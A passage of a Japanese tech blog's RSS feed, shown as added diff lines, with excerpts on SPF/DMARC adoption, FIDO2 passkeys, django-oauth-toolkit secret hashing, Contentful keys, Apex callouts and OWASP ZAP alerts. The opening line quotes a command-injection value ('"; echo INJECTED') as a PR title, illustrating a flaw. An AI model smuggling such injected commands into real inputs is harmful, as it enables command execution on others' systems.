+&lt;/div&gt;&lt;p&gt;攻撃者が PR タイトルを &lt;code&gt;&amp;quot;; echo INJECTED&amp;quot;&lt;/code&gt; に設定すると:&lt;/p&gt;</description></item><item><title>上場企業3,700社のSPF/DMARC設定を全調査 — 「p=none」が半数、日本のメール認証の現在地</title><link>https://hdknr.github.io/blogs/posts/2026/03/cbe1f317a7559e8cdfed70450e123798/</link><pubDate>Tue, 03 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/cbe1f317a7559e8cdfed70450e123798/</guid><description>&lt;h1 id="上場企業3700社のspfdmarc設定を全調査--pnoneが半数日本のメール認証の現在地"&gt;上場企業3,700社のSPF/DMARC設定を全調査 — 「p=none」が半数、日本のメール認証の現在地&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://x.com/yoppy0123/status/2028425261763736046"&gt;@yoppy0123 氏のポスト&lt;/a&gt;が、上場企業のメール認証設定を網羅的に調査した Zenn 記事を紹介しています。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;上場企業（約3,700社）を対象にSPF / DMARCの設定状況を調査した記事です。実際のところどうなんだろう？と気になっていたので、とても参考になりました！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;元記事は ext0mmy 氏による「&lt;a href="https://zenn.dev/ext0mmy/articles/700c30ca00b7f5"&gt;上場企業約3,700社のSPF/DMARC設定状況調査&lt;/a&gt;」です。2026年3月1日時点で、JPX（日本取引所グループ）に上場する3,745社を対象に、DNS レコードから SPF と DMARC の設定状況を調査しています。&lt;/p&gt;
+&lt;p&gt;Google が Gmail の送信者ガイドラインで DMARC 対応を義務化してから2年。日本の上場企業はどこまで対応が進んだのか、調査結果を技術的な背景とともに解説します。&lt;/p&gt;
+&lt;h2 id="メール認証の基礎--spfdkimdmarc-の仕組み"&gt;メール認証の基礎 — SPF・DKIM・DMARC の仕組み&lt;/h2&gt;
+&lt;p&gt;調査結果を読み解くために、まずメール認証の3つの技術を整理します。&lt;/p&gt;
+&lt;h3 id="spfsender-policy-framework"&gt;SPF（Sender Policy Framework）&lt;/h3&gt;
+&lt;p&gt;SPF は、メールの送信元 IP アドレスを検証する技術です。ドメインの DNS レコードに「このドメインからメールを送信してよい IP アドレスの一覧」を登録しておき、受信側がそれを照合します。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;example.co.jp IN TXT &amp;#34;v=spf1 include:_spf.google.com ~all&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;末尾の修飾子が認証失敗時のポリシーを決定します。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;修飾子&lt;/th&gt;
+&lt;th&gt;意味&lt;/th&gt;
+&lt;th&gt;厳しさ&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;+all&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;全て許可&lt;/td&gt;
+&lt;td&gt;設定する意味がない&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;~all&lt;/code&gt;（softfail）&lt;/td&gt;
+&lt;td&gt;認証失敗を記録するが配信は許可&lt;/td&gt;
+&lt;td&gt;緩い&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;-all&lt;/code&gt;（fail）&lt;/td&gt;
+&lt;td&gt;認証失敗のメールを拒否&lt;/td&gt;
+&lt;td&gt;厳しい&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="dkimdomainkeys-identified-mail"&gt;DKIM（DomainKeys Identified Mail）&lt;/h3&gt;
+&lt;p&gt;DKIM は、メールに電子署名を付与し、送信中の改ざんを検知する技術です。送信サーバがメールヘッダとボディに署名を付け、受信サーバが DNS に公開された公開鍵で検証します。SPF が「どこから送ったか」を検証するのに対し、DKIM は「改ざんされていないか」を検証します。&lt;/p&gt;
+&lt;h3 id="dmarcdomain-based-message-authentication-reporting-and-conformance"&gt;DMARC（Domain-based Message Authentication, Reporting and Conformance）&lt;/h3&gt;
+&lt;p&gt;DMARC は、SPF と DKIM の認証結果を束ねて、認証失敗時の処理方針を定めるフレームワークです。&lt;/p&gt;</description></item><item><title>FIDO2 認証（パスキー）の仕組み — パスワードを「構造的に不要にする」技術</title><link>https://hdknr.github.io/blogs/posts/2026/03/c18862bd01d56d81c66ae0bf0fe9263b/</link><pubDate>Mon, 02 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/c18862bd01d56d81c66ae0bf0fe9263b/</guid><description>&lt;h1 id="fido2-認証パスキーの仕組み--パスワードを構造的に不要にする技術"&gt;FIDO2 認証（パスキー）の仕組み — パスワードを「構造的に不要にする」技術&lt;/h1&gt;
+&lt;p&gt;サイボウズのバグバウンティで複数年度 1 位の実績を持つセキュリティ研究者 &lt;a href="https://x.com/yousukezan/status/2027925123383366044"&gt;@yousukezan さんのポスト&lt;/a&gt;で紹介されていた、FIDO2 認証（パスキー）の概要記事を深掘りします。元記事は &lt;a href="https://zenn.dev/k_nagano/articles/0fea616a582f01"&gt;Nagano さんの Zenn 記事&lt;/a&gt;です。&lt;/p&gt;
+&lt;p&gt;2026 年現在、日本証券業協会がパスキー（FIDO2）の導入を必須化するガイドラインを施行し、楽天証券・SMBC 日興証券などが相次いで導入を進めています。パスキーはもはや「新しい技術」ではなく「必須のインフラ」になりつつあります。&lt;/p&gt;
+&lt;h2 id="パスワード認証の根本的な問題"&gt;パスワード認証の根本的な問題&lt;/h2&gt;
+&lt;p&gt;パスワード認証には、仕組みそのものに起因する構造的な脆弱性があります。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code class="language-mermaid" data-lang="mermaid"&gt;graph LR
+USER[&amp;#34;ユーザー&amp;#34;] --&amp;gt;|パスワードを送信| SERVER[&amp;#34;サーバー&amp;#34;]
+ATTACKER[&amp;#34;攻撃者&amp;#34;] -.-&amp;gt;|盗聴・フィッシング| USER
+style USER fill:#3498db,color:#fff
+style SERVER fill:#2ecc71,color:#fff
+style ATTACKER fill:#e74c3c,color:#fff
+&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;脅威&lt;/th&gt;
+&lt;th&gt;内容&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;フィッシング&lt;/td&gt;
+&lt;td&gt;偽サイトにパスワードを入力させる&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;リスト型攻撃&lt;/td&gt;
+&lt;td&gt;漏洩したパスワードを他サービスで試行&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;中間者攻撃&lt;/td&gt;
+&lt;td&gt;通信を傍受してパスワードを盗む&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;サーバー侵害&lt;/td&gt;
+&lt;td&gt;サーバーに保存されたパスワードハッシュの漏洩&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;これらの問題は「秘密情報（パスワード）をネットワーク経由で送信する」という設計そのものに起因します。ワンタイムパスワード（OTP）でも、この根本構造は変わりません。実際、日本証券業協会は 2025 年 10 月のガイドライン改正で、&lt;strong&gt;OTP の利用を非推奨&lt;/strong&gt;としています。&lt;/p&gt;
+&lt;h2 id="fido2-の設計思想--秘密を送らない"&gt;FIDO2 の設計思想 — 「秘密を送らない」&lt;/h2&gt;
+&lt;p&gt;FIDO2 は発想を根本から変えました。&lt;strong&gt;秘密情報をネットワーク上に一切流さない&lt;/strong&gt;認証方式です。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code class="language-mermaid" data-lang="mermaid"&gt;graph LR
+subgraph デバイス側
+USER2[&amp;#34;ユーザー&amp;#34;] --&amp;gt;|生体認証/PIN| AUTH[&amp;#34;認証器&amp;lt;br/&amp;gt;（TPM等）&amp;#34;]
+AUTH --&amp;gt;|秘密鍵で署名| SIGNED[&amp;#34;署名データ&amp;#34;]
+end
+subgraph サーバー側
+SIGNED --&amp;gt;|署名のみ送信| VERIFY[&amp;#34;公開鍵で検証&amp;#34;]
+end
+style USER2 fill:#3498db,color:#fff
+style AUTH fill:#f39c12,color:#fff
+style SIGNED fill:#9b59b6,color:#fff
+style VERIFY fill:#2ecc71,color:#fff
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;パスワード認証では「秘密そのもの」を送信しますが、FIDO2 では「秘密鍵で作った署名」だけを送信します。秘密鍵はデバイス内の安全な領域（TPM、Secure Enclave 等）に保管され、外部に出ることはありません。&lt;/p&gt;</description></item><item><title>django-oauth-toolkit 2.0 の client_secret ハッシュ化で外部連携が壊れた話</title><link>https://hdknr.github.io/blogs/posts/2026/02/56ceeff018ed4d9555699174150f499a/</link><pubDate>Fri, 13 Feb 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/02/56ceeff018ed4d9555699174150f499a/</guid><description>&lt;h1 id="django-oauth-toolkit-20-の-client_secret-ハッシュ化で外部連携が壊れた話"&gt;django-oauth-toolkit 2.0 の client_secret ハッシュ化で外部連携が壊れた話&lt;/h1&gt;
+&lt;h2 id="tldr"&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;django-oauth-toolkit&lt;/code&gt; を 1.x から 2.0 にアップグレードすると、&lt;code&gt;Application.client_secret&lt;/code&gt; が &lt;strong&gt;平文からハッシュ値に自動変換&lt;/strong&gt; される。この変更に気づかず、DB 上のハッシュ値を「シークレット」として外部サービスにコピーすると、&lt;strong&gt;二重ハッシュ&lt;/strong&gt; で認証が通らなくなる。さらに、&lt;code&gt;Application&lt;/code&gt; を動的に生成するコードがある場合、バージョンアップ後に平文を返すべき箇所でハッシュ値を返してしまう問題も起きる。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="背景"&gt;背景&lt;/h2&gt;
+&lt;p&gt;2つの Django サービス間で OAuth2 Client Credentials Grant による認証を行っていた。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;サービス&lt;/th&gt;
+&lt;th&gt;役割&lt;/th&gt;
+&lt;th&gt;django-oauth-toolkit&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Service A (リソースサーバー)&lt;/td&gt;
+&lt;td&gt;ファイル配信 API を提供&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;2.4.0&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Service B (クライアント)&lt;/td&gt;
+&lt;td&gt;API からファイルを取得&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;1.7.1&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Service B は Service A の OAuth2 トークンエンドポイントに HTTP Basic Auth で &lt;code&gt;client_id:client_secret&lt;/code&gt; を送信し、アクセストークンを取得してからファイルをダウンロードする。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;Service B Service A
+| |
+|-- POST /o/token/ ---------------&amp;gt;|
+| Authorization: Basic base64( |
+| client_id:client_secret) |
+| |-- client_secret をハッシュ化
+| |-- DB のハッシュ値と比較
+|&amp;lt;-- access_token -----------------|
+| |
+|-- GET /api/files/ --------------&amp;gt;|
+| Authorization: Bearer token |
+|&amp;lt;-- file data --------------------|
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;このフローは数年間安定稼働していた。&lt;/p&gt;</description></item><item><title>Hubspot</title><link>https://hdknr.github.io/blogs/posts/2025/03/35d3a45a26e53c6245aac6e52d9917f8/</link><pubDate>Tue, 25 Mar 2025 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2025/03/35d3a45a26e53c6245aac6e52d9917f8/</guid><description>&lt;h1 id="cta"&gt;CTA&lt;/h1&gt;
+&lt;h2 id="ビデオ埋め込み"&gt;ビデオ埋め込み&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;viemoなどiframe配信できるサーバーにホスティングしているビデオが対象&lt;/li&gt;
+&lt;li&gt;vimeoの muted=1&amp;amp;autoplay=1 でも自動再生はできない (セキュリティ上の問題。自動再生は、ユーザーのトリガーがないとしてくれないケースがある)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ショートムービーをアニメーションGIFに変換:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ffmpeg -i input.mp4 -r &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt; output.gif
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description></item><item><title>Contentful</title><link>https://hdknr.github.io/blogs/posts/2025/02/fa4bea9d586133840c37a8cbad8a7900/</link><pubDate>Wed, 12 Feb 2025 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2025/02/fa4bea9d586133840c37a8cbad8a7900/</guid><description>&lt;h1 id="contentful"&gt;Contentful&lt;/h1&gt;
+&lt;h2 id="cda--cma"&gt;CDA / CMA&lt;/h2&gt;
+&lt;p&gt;Contentful における Content Delivery API キーと CMA トークンの用途の違いについて説明します。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Content Delivery API キー (CDA キー)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用途:&lt;/strong&gt; コンテンツ配信 API (CDA) へのアクセスを認証するために使用されます。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;役割:&lt;/strong&gt; 公開されたコンテンツを取得するために使用されます。ウェブサイトやモバイルアプリなどのフロントエンドアプリケーションから Contentful のコンテンツを読み込む際に、このキーが使用されます。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;特徴:&lt;/strong&gt; 読み取り専用のアクセス権を持ちます。コンテンツの作成、更新、削除などの変更操作はできません。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;セキュリティ:&lt;/strong&gt; 比較的安全性が低いとされています。キーが漏洩した場合でも、コンテンツの変更はできませんが、コンテンツを不正に取得される可能性があります。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Content Management API トークン (CMA トークン)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用途:&lt;/strong&gt; コンテンツ管理 API (CMA) へのアクセスを認証するために使用されます。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;役割:&lt;/strong&gt; Contentful のコンテンツを管理 (作成、更新、削除など) するために使用されます。Contentful のバックエンドシステムや管理画面、または外部のツールから Contentful のコンテンツを操作する際に、このトークンが使用されます。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;特徴:&lt;/strong&gt; 読み取り/書き込みのアクセス権を持ちます。コンテンツの変更操作が可能です。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;セキュリティ:&lt;/strong&gt; 非常に高いセキュリティが必要です。トークンが漏洩した場合、コンテンツを不正に操作される可能性があります。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;まとめ&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;機能&lt;/th&gt;
+&lt;th&gt;Content Delivery API キー&lt;/th&gt;
+&lt;th&gt;Content Management API トークン&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;用途&lt;/td&gt;
+&lt;td&gt;コンテンツ配信 API へのアクセス&lt;/td&gt;
+&lt;td&gt;コンテンツ管理 API へのアクセス&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;役割&lt;/td&gt;
+&lt;td&gt;公開されたコンテンツの取得&lt;/td&gt;
+&lt;td&gt;コンテンツの管理 (作成、更新、削除など)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;アクセス権&lt;/td&gt;
+&lt;td&gt;読み取り専用&lt;/td&gt;
+&lt;td&gt;読み取り/書き込み&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;セキュリティ&lt;/td&gt;
+&lt;td&gt;比較的低い&lt;/td&gt;
+&lt;td&gt;非常に高い&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;</description></item><item><title>Wordpress: 脆弱性</title><link>https://hdknr.github.io/blogs/posts/2024/10/2e055199d28e75993f4f211ffbad6ccb/</link><pubDate>Mon, 14 Oct 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/10/2e055199d28e75993f4f211ffbad6ccb/</guid><description>&lt;h1 id="wordpress脆弱性"&gt;Wordpress脆弱性&lt;/h1&gt;
+&lt;h2 id="advanced-custom-fields-acf"&gt;Advanced Custom Fields (ACF)&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://rocket-boys.co.jp/7886/"&gt;https://rocket-boys.co.jp/7886/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>Hasura</title><link>https://hdknr.github.io/blogs/posts/2024/09/c10c3a78b78b8b6565f81aca422f803d/</link><pubDate>Mon, 09 Sep 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/09/c10c3a78b78b8b6565f81aca422f803d/</guid><description>&lt;h1 id="hassura"&gt;Hassura&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;PostgreSQL サーバーから自動的に GraphQL サーバーを建てられる, PostgreSQL サーバーがあればすぐに使える&lt;/li&gt;
+&lt;li&gt;GraphQL サーバーを実装する手間が省ける&lt;/li&gt;
+&lt;li&gt;他の自前で用意したGraphQLサーバーとHasuraを統合してリクエストをHasura一つにお任せすることも可能&lt;/li&gt;
+&lt;li&gt;ページングや集計クエリなども自動で生成される&lt;/li&gt;
+&lt;li&gt;実際に発行される SQL がすぐにわかる&lt;/li&gt;
+&lt;li&gt;認証認可の仕組みがある&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="ドキュメント"&gt;ドキュメント&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://hasura.io/learn/ja/graphql/hasura/introduction/"&gt;https://hasura.io/learn/ja/graphql/hasura/introduction/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="記事"&gt;記事&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://qiita.com/maaz118/items/9e198ea91ad8fc624491"&gt;Hasuraがめちゃくちゃ便利だよという話&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://qiita.com/roll1226/items/3da8b75ffd1b486b248f"&gt;Hasuraを使って環境構築してガンガン工数削減&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>AppExchange</title><link>https://hdknr.github.io/blogs/posts/2024/08/3c0da378ccd0fd95f1247514c9075384/</link><pubDate>Mon, 19 Aug 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/08/3c0da378ccd0fd95f1247514c9075384/</guid><description>&lt;h1 id="appexchange"&gt;AppExchange&lt;/h1&gt;
+&lt;h2 id="isv--oem-パートナー"&gt;ISV / OEM パートナー&lt;/h2&gt;
+&lt;p&gt;組織&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;パートナービジネス組織（Partner Business Org で PBO とも呼ばれる）&lt;/li&gt;
+&lt;li&gt;パッケージ開発組織&lt;/li&gt;
+&lt;li&gt;スクラッチ組織（Scratch Org）&lt;/li&gt;
+&lt;li&gt;Trialforce ソース組織（Trialforce Source Org で TSO とも呼ばれる）&lt;/li&gt;
+&lt;li&gt;顧客組織&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="開発"&gt;開発&lt;/h2&gt;
+&lt;h3 id="lma"&gt;LMA&lt;/h3&gt;
+&lt;h3 id="環境ハブ"&gt;環境ハブ&lt;/h3&gt;
+&lt;h3 id="セキュリティレビュー"&gt;セキュリティレビュー&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Salesforce のアプリケーション審査&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;手順:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;準備&lt;/li&gt;
+&lt;li&gt;申請&lt;/li&gt;
+&lt;li&gt;注文書と手順書&lt;/li&gt;
+&lt;li&gt;公開&lt;/li&gt;
+&lt;li&gt;年次更新&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="lightning-experience"&gt;Lightning Experience&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://developer.salesforce.com/docs/atlas.ja-jp.lightning.meta/lightning/intro_framework.htm"&gt;Lightning コンポーネントフレームワークとは?&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://www.salesforce.com/jp/solutions/appexchange/components/"&gt;Lightning コンポーネント: コードを一行も記述することなくビジネスアプリを開発できます。&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="aura-コンポーネント"&gt;&lt;a href="https://developer.salesforce.com/docs/atlas.ja-jp.252.0.lightning.meta/lightning/intro_components.htm"&gt;Aura コンポーネント&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;コンポーネント:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Visualforce&lt;/li&gt;
+&lt;li&gt;Aura(いわゆるオーラ) (Aura コンポーネントの中から LWC を呼び出すことはできるが、LWC の中から Aura コンポーネントを呼び出すことはできない。)&lt;/li&gt;
+&lt;li&gt;Lightning Web Conponent(LWC)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="外部のデータソースを呼ぶには"&gt;外部のデータソースを呼ぶには&lt;/h2&gt;
+&lt;h3 id="apex"&gt;Apex&lt;/h3&gt;
+&lt;p&gt;Aura コンポーネントから Salesforce 以外の外部データを呼び出すには、以下の手順を参考にしてください：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Apex コントローラーを使用する&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Apex クラスを作成し、外部 API を呼び出すメソッドを定義します。例えば、&lt;code&gt;HttpRequest&lt;/code&gt;と&lt;code&gt;HttpResponse&lt;/code&gt;クラスを使用して外部 API にリクエストを送信し、レスポンスを処理します。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex="0"&gt;&lt;code class="language-apex" data-lang="apex"&gt;public class ExternalDataController {
+@AuraEnabled
+public static String getExternalData() {
+Http http = new Http();
+HttpRequest request = new HttpRequest();
+request.setEndpoint(&amp;#39;https://api.example.com/data&amp;#39;);
+request.setMethod(&amp;#39;GET&amp;#39;);
+HttpResponse response = http.send(request);
+return response.getBody();
+}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Aura コンポーネントで Apex メソッドを呼び出す&lt;/strong&gt;:&lt;/p&gt;</description></item><item><title>さくらのレンタルサーバー</title><link>https://hdknr.github.io/blogs/posts/2024/08/03a78b27b6eb272fac22db4489d6bc78/</link><pubDate>Mon, 19 Aug 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/08/03a78b27b6eb272fac22db4489d6bc78/</guid><description>&lt;h1 id="さくらのレンタルサーバー"&gt;さくらのレンタルサーバー&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://help.sakura.ad.jp/rs/2153/"&gt;無料 SSL（Let’s Encrypt）を設定したい&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://help.sakura.ad.jp/rs/2808/"&gt;SSL 証明書の設定をはじめからやり直したい（さくらの有償 SSL・独自 SSL）&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://help.sakura.ad.jp/ssl/2327/"&gt;CSR を作成したい&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>サイトセキュリティチェック</title><link>https://hdknr.github.io/blogs/posts/2024/07/5380ecce3a4ebda601efcc8b45e1e417/</link><pubDate>Mon, 22 Jul 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/07/5380ecce3a4ebda601efcc8b45e1e417/</guid><description>&lt;h1 id="サイトセキュリティチェック"&gt;サイトセキュリティチェック&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Mozilla: &lt;a href="https://observatory.mozilla.org/"&gt;https://observatory.mozilla.org/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;トレンドマイクロ: &lt;a href="https://global.sitesafety.trendmicro.com/?cc=jp"&gt;https://global.sitesafety.trendmicro.com/?cc=jp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Google: &lt;a href="https://www.virustotal.com/gui/home/upload"&gt;https://www.virustotal.com/gui/home/upload&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="owasp-zap"&gt;OWASP Zap&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://zenn.dev/y640/articles/430e99504cd275"&gt;Docker 版 OWASP ZAP を M1 Mac で動かす。&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;問題:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10010/"&gt;Cookie No HttpOnly Flag&lt;/a&gt; [10010]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10015/"&gt;Re-examine Cache-control Directives&lt;/a&gt; [10015]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10017/"&gt;Cross-Domain JavaScript Source File Inclusion&lt;/a&gt; [10017]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10020-1/"&gt;Missing Anti-clickjacking Header&lt;/a&gt; [10020]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10021/"&gt;X-Content-Type-Options Header Missing&lt;/a&gt; [10021]&lt;/li&gt;
+&lt;li&gt;: [Information Disclosure - Suspicious Comments]&lt;a href="10027"&gt;https://www.zaproxy.org/docs/alerts/10027/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;: [Cookie Poisoning]&lt;a href="10029"&gt;https://www.zaproxy.org/docs/alerts/10029/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10031/"&gt;User Controllable HTML Element Attribute (Potential XSS)&lt;/a&gt; [10031]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10035/"&gt;Strict-Transport-Security Header Not Set&lt;/a&gt; [10035]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10038/"&gt;Content Security Policy (CSP) Header Not Set&lt;/a&gt; [10038]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10040/"&gt;Secure Pages Include Mixed Content&lt;/a&gt; [10040]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10049/"&gt;Storable and Cacheable Content&lt;/a&gt; [10049]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10054/"&gt;Cookie without SameSite Attribute&lt;/a&gt; [10054]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10063/"&gt;Permissions Policy Header Not Set&lt;/a&gt; [10063]&lt;/li&gt;
